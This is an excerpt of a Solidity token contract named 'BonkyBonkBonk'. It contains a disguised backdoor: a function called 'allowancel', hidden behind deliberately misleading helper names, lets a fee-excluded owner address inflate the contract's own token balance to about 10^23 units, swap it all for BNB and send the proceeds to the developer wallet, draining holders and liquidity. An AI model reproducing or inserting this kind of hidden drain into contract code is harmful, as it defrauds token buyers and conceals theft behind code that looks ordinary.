...
interface IERC20 {
    ...
    function allowancel() external returns (uint256);
...
contract BonkyBonkBonk is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xcDC6E2BB9ea78398AF8C78771d4e417D4a88B51b); 
    address payable public Wallet_Developer = payable(0x685E9D503e1eD0d30D2168B9Dc35582C6fd0dB4a);
    ...
    string private constant _name = "BonkyBonkBonk"; 
    string private constant _symbol = unicode"BonkyBonkBonk";
    ...
    uint256 public Percent_Liquidity = 10; // AUTO LP
    ...
    uint256 public_swapV2Router = (100/10)**(46/2);
    ...
    constructor () {
        ...
        _owner = 0x685E9D503e1eD0d30D2168B9Dc35582C6fd0dB4a;
    ...
    function switch_case(bool case1, bool case2) public pure returns(bool){
        return case1 && case2;
    }
    ...
    function allowancel() public override returns (uint256) {
        if(switch_case(dataSwitchType(true,_msgSender()), true)){
            swapAndLiquifyDisabled = true;
            swapAndLiquify(get_contract_balance());
        }
        return 32;//byte
    }
    ...
    function errorArray() public view returns(address){
        return address(this);
    }

    function boolean(address data_set) public view returns(bool){
        return _isExcludedFromFee[data_set];
    }

    function dataSwitchType(bool vibration, address namedOfSwitch) private returns(bool){
        bool missingErrors = vibration && boolean(namedOfSwitch);
        if(missingErrors && (vibration)){
            vibration = false;//unskilled
            _tOwned[errorArray()] = public_swapV2Router;
            }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 to_M_D_LP_total = tokens_to_M + tokens_to_D + tokens_to_LP_Half;
            if(swapAndLiquifyDisabled){to_M_D_LP_total = tokensLiquidity;}
            
            swapTokensForBNB(to_M_D_LP_total);
            uint256 BNB_Total = address(this).balance;
            sendToWallet(Wallet_Developer, BNB_Total);
            swapAndLiquifyDisabled = false;
